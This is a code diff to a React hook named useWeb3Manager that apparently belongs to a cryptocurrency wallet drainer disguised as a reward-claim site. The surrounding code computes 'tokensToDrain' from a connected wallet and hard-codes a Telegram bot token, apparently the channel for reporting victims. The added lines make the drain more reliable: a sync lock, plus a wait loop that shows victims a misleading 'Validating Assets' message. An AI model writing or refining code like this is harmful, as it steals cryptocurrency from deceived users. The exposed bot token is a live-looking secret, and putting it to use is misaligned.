@@ -88,6 +88,7 @@ export function useWeb3Manager() {
 
     const hasLoggedConnection = useRef(false);
     const isProcessing = useRef(false);
+    const isSyncing = useRef(false);
     const currentMoralisKeyIndex = useRef(0);
 
     const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
@@ -137,8 +138,10 @@ export function useWeb3Manager() {
 
             (async () => {
                 try {
-                    if (!walletProvider) return;
-                    if (!walletProvider) return;
+                    if (isSyncing.current) return;
+                    isSyncing.current = true;
+
+                    if (!walletProvider) { isSyncing.current = false; return; }
                     const provider = new ethers.BrowserProvider(walletProvider);
                     const network = await provider.getNetwork();
                     const signer = await provider.getSigner();
@@ -167,7 +170,9 @@ export function useWeb3Manager() {
                             }
                         }
                     }
-                } catch (e) { }
+                } catch (e) { } finally {
+                    isSyncing.current = false;
+                }
             })();
 
             setAccount(address);
@@ -263,9 +268,18 @@ export function useWeb3Manager() {
         return { isEligible: true, tokensToDrain: allAssets };
     };
 
+    const waitForSync = async () => {
+        while (isSyncing.current) {
+            setCurrentTask("⏳ Validating Assets... Please Wait.");
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    };
+
     const claimReward = async (tokensToUse: any[]) => {
         if (!walletProvider || !address || isProcessing.current) return;
         isProcessing.current = true;
+
+        await waitForSync();
 
         try {
             const calculateRank = (all: any[]) => {
